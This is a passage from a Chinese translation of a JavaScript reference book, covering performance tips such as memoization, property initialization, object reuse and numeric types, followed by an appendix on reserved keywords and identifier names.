  \ = JSON.stringify(args);\n    // 此示例也适用于相同的替代方案\n    if (argsKey in cache) {\n\
  \      console.log(argsKey + ' was/were in cache :D');\n      return cache[argsKey];\n\
  \    } else {\n      cache[argsKey] = func.apply(null, args); // 缓存它\n      return\
  \ cache[argsKey]; // 然后返回它\n    }\n  }\n  return memoized; // 返回记忆化的函数\n}\n```\n\
  \n现在注意，这适用于多个参数，但我认为在面向对象的方法中可能没有太大用，你可能需要一个额外的对象来处理依赖。此外，`func.apply(null, args)`\
  \ 可以被 `func(...args)` 替换，因为数组解构会将它们分开发送而不是作为数组形式。此外，仅仅为了引用，除非你像我那样使用 `Function.prototype.apply`，否则将数组作为参数传递给\
  \ `func` 是不起作用的。使用上述方法只需：\n\n```javascript\nconst newFunction = memoize(oldFunction);\n\
  // 假设 oldFunction 直接求和：\nnewFunction('meaning of life', 42); // -> \"meaning of\
  \ life\"\n\nnewFunction('meaning of life', 42); // 再次 => [\"meaning of life\",42\
  \ was in cache :D\n```\n\n### 104.5: 使用 null 初始化属性\n\n所有现代 JavaScript JIT 编译器都会根据预期的对象结构进行优化。来自\
  \ mdn，对象和属性通常是“可预测的”，在这种情况下它们的底层结构是可预测的。JIT 可以依靠此点来加速访问。\n\n使对象变得可预测的最佳方法是在构造函数中定义它们。如果你要在创建对象后添加某些属性，在构造函数中用\
  \ `null` 初始化它们将有助于优化器预测其整个生命周期。然而，所有编译器都有不同的优化器，性能的提升可能会不同。在我的测试中，在循环中，我用 `null`\
  \ 初始化对象的 `x` 属性。\n\n代码如下：\n\n```javascript\nfunction f1() {\n  var P = function\
  \ () {\n    this.value = 1\n  };\n  var big_array = new Array(10000000).fill(1).map((x,\
  \ index)=> {\n    var p = new P();\n    if (index > 5000000) { p.x = \"some_string\"\
  ; }\n    return p;\n  });\n  big_array.reduce((sum, p)=> sum + p.value, 0);\n}\n\
  \nfunction f2() {\n  var P = function () {\n    this.value = 1;\n    this.x = null;\n\
  \  };\n  var big_array = new Array(10000000).fill(1).map((x, index)=> {\n    var\
  \ p = new P();\n    if (index > 5000000) {\n      p.x = \"some_string\";\n    }\n\
  \    return p;\n  });\n  big_array.reduce((sum, p)=> sum + p.value, 0);\n}\n\n(function\
  \ perform(){\n  var start = performance.now();\n  f1();\n  var duration = performance.now()\
  \ - start;\n  console.log('duration of f1 ' + duration);\n  start = performance.now();\n\
  \  f2();\n  var duration = performance.now() - start;\n  console.log('duration of\
  \ f2 ' + duration);\n})()\n```\n\n这是 Chrome 和 Firefox 的结果。\n\nFirefox Chrome\n-------------------------\n\
  f1 6400 11400\nf2 1700 9600\n\n我们可以看到，两者之间的性能差异很大。\n\n### 104.6: 复用对象而不是重新创建\n\n\
  #### 示例 A\n\n```javascript\nvar i,a,b,len;\na = {x:0,y:0}\nfunction test(){ // 每次调用都创建对象\n\
  \  return {x:0,y:0};\n}\nfunction test1(a){ // 返回提供的对象\n  a.x=0;\n  a.y=0;\n  return\
  \ a;\n}\nfor (i = 0; i < 100; i++){ // 循环 A\n  b = test();\n}\nfor (i = 0; i < 100;\
  \ i++){ // 循环 B\n  b = test1(a);\n}\n```\n循环 B 比循环 A 快 4 倍 (400%)\n\n在性能代码中创建新对象是非常低效的。循环\
  \ A 调用 `test()` 函数每次返回一个新对象。创建的对象在每次迭代中都会丢弃，循环 B 调用 `test1()` 要求提供对象。因此它使用了同一个对象，避免了新对象的分配和过度的\
  \ GC 命中（性能测试未包含 GC）。\n\n#### 示例 B\n\n```javascript\nvar i,a,b,len;\na = {x:0,y:0}\n\
  function test2(a){\n  return {x : a.x * 10,y : a.y * 10};\n}\nfunction test3(a){\n\
  \  a.x = 10;\n  a.y = 10;\n  return a;\n}\nfor (i = 0; i < 100; i++){ // 循环 A\n\
  \  b = test2({x : 10, y : 10});\n}\nfor (i = 0; i < 100; i++){ // 循环 B\n  a.x =\
  \ 10;\n  a.y = 10;\n  b = test3(a);\n}\n```\n循环 B 比循环 A 快 5 倍 (500%)\n\n### 104.7:\
  \ 优先使用局部变量而不是全局变量、属性和索引值\n\nJavaScript 引擎首先在局部作用域内查找变量，然后再扩展到更大的作用域。如果变量是数组中的索引值，或者关联数组中的属性，它会先查找父数组，然后找到内容。\n\
  \n这在处理性能关键代码时会有影响。考虑一个常见的 for 循环：\n\n```javascript\nvar global_variable = 0;\nfunction\
  \ foo(){\n  global_variable = 0;\n  for (var i=0; i<items.length; i++) { \n    global_variable\
  \ += items[i];\n  }\n}\n```\n\n上述函数的性能优化重写为：\n\n```javascript\nfunction foo(){\n\
  ```\n\n\n\n\n```javascript\nvar local_variable = 0;\n\nfor (var i=0, li=items.length;\
  \ i<li; i++) {\n\n  local_variable += items[i];\n\n}\n\nreturn local_variable;\n\
  \n}\n```\n\n在重写后的 `for` 循环的每次迭代中，引擎将查找 `li`、`items`、索引 `i` 处的值以及 `local_variable`，但这次只需要检查局部作用域。\n\
  \n## 第 104.8 节：在数字的使用上保持一致\n\n如果引擎能够正确预测你正在对值使用特定的小型数值类型，它将能够优化所执行的代码。\n\n在这个示例中，我们将使用这个简单的函数来计算数组元素的和，并输出所需的时间：\n\
  \n```javascript\n// summing properties\nvar sum = (function(arr){\n\n  var start\
  \ = process.hrtime();\n\n  var sum = 0;\n\n  for (var i=0; i<arr.length; i++) {\n\
  \    sum += arr[i];\n  }\n\n  var diffSum = process.hrtime(start);\n\n  console.log(`Summing\
  \ took ${diffSum[0] * 1e9 + diffSum[1]} nanoseconds`);\n\n  return sum;\n\n})(arr);\n\
  ```\n\n让我们创建一个数组并求元素的和：\n\n```javascript\nvar N = 12345,\n\narr = [];\n\nfor (var\
  \ i=0; i<N; i++) arr[i] = Math.random();\n```\n\n结果：\nSumming took 384416 nanoseconds\n\
  \n现在，让我们做同样的操作，但只使用整数：\n\n```javascript\nvar N = 12345,\n\narr = [];\n\nfor (var\
  \ i=0; i<N; i++) arr[i] = Math.round(1000*Math.random());\n```\n\n结果：\nSumming took\
  \ 180520 nanoseconds\n\n**在这里，整数整数花费了一半的时间。**\n\n引擎并不使用你在 JavaScript 中使用的类型。如你可能所知，JavaScript\
  \ 中的所有数字都是 IEEE754 双精度浮点数，没有专门的整数表示方法。但当引擎能够预测你只使用整数时，可以使用更紧凑、速度更快的表示方法，例如短整数。\n\
  \n这种优化对于计算密集型或数据密集型应用特别重要。\n\n## 第 105 章：内存效率\n\n### 第 105.1 节：创建私有方法的缺点\n\n在 JavaScript\
  \ 中创建私有方法的缺点是内存效率低下，因为每当创建一个新实例，就会创建一个私有方法的拷贝。看这个简单的示例。\n\n```javascript\nfunction\
  \ contact(first, last) {\n\n  this.firstName = first;\n\n  this.lastName = last;\n\
  \n  this.mobile;\n\n  // private method\n  var formatPhoneNumber = function(number)\
  \ {\n\n    // 根据输入格式化手机号码\n  };\n\n  // public method\n  this.setMobileNumber =\
  \ function(number) {\n    this.mobile = formatPhoneNumber(number);\n  };\n\n}\n\
  ```\n\n当你创建几个实例时，它们都拥有 `formatPhoneNumber` 方法的拷贝\n\n```javascript\nvar rob = new\
  \ contact('Rob', 'Sanderson'); var don = new contact('Donald', 'Trump'); var andy\
  \ = new contact('Andy', 'Whitehall');\n```\n\n因此，只有在必要时才避免使用私有方法将是最好的。\n\n## 附录\
  \ A：保留关键字\n\n某些单词——即所谓的关键字——在 JavaScript 中被特殊处理。有许多不同类型的关键字，它们在语言的不同版本中发生了变化。\n\n\
  ### 第 A.1 节：保留关键字\n\nJavaScript 拥有一组预定义的保留关键字，你不能将它们用变量、标签或函数名。\n\n#### ECMAScript\
  \ 1\nVersion = 1\nA — E E — R S — Z\n`break` `export` `super`\n`case` `extends`\
  \ `switch`\n`catch` `false` `this`\n`class` `finally` `throw`\n`const` `for` `true`\n\
  `continue` `function` `try`\n`debugger` `if` `typeof`\n`default` `import` `var`\n\
  `delete` `in` `void`\n`do` `new` `while`\n`else` `null` `with`\n`enum` `return`\n\
  \n#### ECMAScript 2\n增加了 24 个额外的保留关键字。（粗体为新新增的内容）。\nVersion = 3 Version = E4X\n\
  A — F F — P P — Z\n`abstract` `final` `public`\n`boolean` `finally` `return`\n`break`\
  \ `float` `short`\n`byte` `for` `static`\n`case` `function` `super`\n`catch` `goto`\
  \ `switch`\n`char` `if` `synchronized`\n`class` `implements` `this`\n`const` `import`\
  \ `throw`\n`continue` `in` `throws`\n`debugger` `instanceof` `transient`\n`default`\
  \ `int` `true`\n`delete` `interface` `try`\n`do` `long` `typeof`\n`double` `native`\
  \ `var`\n`else` `new` `void`\n`enum` `null` `volatile`\n`export` `package` `while`\n\
  `extends` `private` `with`\n`false` `protected`\n\n#### ECMAScript 5 / 5.1\n自 ECMAScript\
  \ 3 以来没有变化。\nECMAScript 5 删除了 `int`, `byte`, `char`, `goto`, `long`, `final`, `float`,\
  \ `short`, `double`, `native`, `throws`, `boolean`, `abstract`, `volatile`, `transient`,\
  \ 和 `synchronized`；它增加了 `let` 和 `yield`。\n`break` `finally` `public` `case` `for`\
  \ `return` `catch` `function` `static` `class` `if` `super` `const` `implements`\
  \ `switch` `continue` `import` `this` `debugger` `in` `throw` `default` `instanceof`\
  \ `true` `delete` `interface` `try` `do` `let` `typeof` `else` `new` `var` `enum`\
  \ `null` `void` `export` `package` `while` `extends` `private` `with` `false` `protected`\
  \ `yield`\n\n`implements`, `let`, `private`, `public`, `interface`, `package`, `protected`,\
  \ `static`, 和 `yield` 仅在严格模式下不允许使用。\n\n`eval` 和 `arguments` 不是保留关键字，但它们是保留字。\n\n\
  #### ECMAScript 6 / 2015\n`break` `export` `super`\n`case` `extends` `switch`\n\
  `catch` `finally` `this`\n`class` `for` `throw`\n`const` `function` `try`\n`continue`\
  \ `if` `typeof`\n`debugger` `import` `var`\n`default` `in` `void`\n`do` `new` `while`\n\
  `else` `return` `yield`\n\n未来保留关键字\n以下是 ECMAScript 规范保留的未来关键字。它们目前没有特殊功能，但在未来可能无法作为标识符使用。\n\
  `enum`\n\n以下仅在严格模式代码中被保留：\n`implements` `package` `public` `interface` `private`\
  \ `static` `let` `protected`\n\n旧标准中的未来保留关键字\n以下是 ECMAScript 1 到 3 中保留的未来关键字。\n\
  `abstract` `float` `short`\n`boolean` `goto` `synchronized` `byte` `instanceof`\
  \ `throws` `char` `int` `transient` `double` `long` `volatile` `final` `native`\n\
  \n此外，字面量 `null`, `true` 和 `false` 在 ECMAScript 中不能用作标识符。来自 Mozilla Developer Network\n\
  \n### 第 A.2 节：标识符与标识符名称\n\n关于保留关键字，用于变量或函数名的“标识符”（Identifiers）与作为复合类型属性的“标识名称”（Identifier\
  \ Names）之间存在细微区别。\n\n例如以下内容会导致语法错误：\n\n```javascript\nvar break = true;\n```\nUncaught\
  \ SyntaxError: Unexpected token break\n\n然而该名称作为对象的属性是有效的（如 ECMAScript 5+）：\n\n\
  ```javascript\nvar obj = {\n  break: true\n};\n\nconsole.log(obj.break);\n```\n\n\
  引用此答案：\n来自 ECMAScript® 5.1 语言规范：\n节 7.6\n标识符是根据 Unicode 标准第 5 章“标识符”部分的语法解释的令牌，并进行了一些小修改。标识符是不保留保留字（见\
  \ 7.6.1）。\n\n**语法**\nIdentifier ::\nIdentifierName 但不是 ReservedWord\n\n根据规范，保留字是：\n\
  节 7.6.1\n保留字是不能作为标识符使用的 IdentifierName。\n\nReservedWord ::\nKeyword\nFutureReservedWord\n\
  NullLiteral\nBooleanLiteral\n\n这包括关键字、未来关键字、`null` 和布尔字面量。完整的关键字列表位于 7.6.1 节和 7.8\
  \ 节。\n\n上述（节 7.6）意味着 IdentifierName 可以是保留字，并且根据对象初始化器的规范：\n节 11.1.5\n**语法**\nObjectLiteral\
  \ :\n{ }\n{ PropertyNameAndValueList } { PropertyNameAndValueList , }\n其中 PropertyName\
  \ 根据规范定义为：\nPropertyName : IdentifierName StringLiteral NumericLiteral\n\n\n\n\n\
  正如你所见，`PropertyName` 可以是一个 `IdentifierName`，因此允许 `ReservedWords` 成为 `PropertyNames`。这明确告诉我们，*根据规范*，允许将如\
  \ `class` 和 `var` 等 `ReservedWords` 作为不带引号的 `PropertyNames`，就像字符串字面量或数字字面量一样。\n\n\
  欲了解更多信息，请参阅第 7.6 节 - 标识符名称与标识符。\n\n***注：***示例中的语法高亮器识别出了保留字并对其进行了高亮。虽然该示例是有效的 JavaScript，但开发者可能会被某些认为观点不同的编译器/转译器、代码检查工具（linter）和压缩化工具所误导。\n\
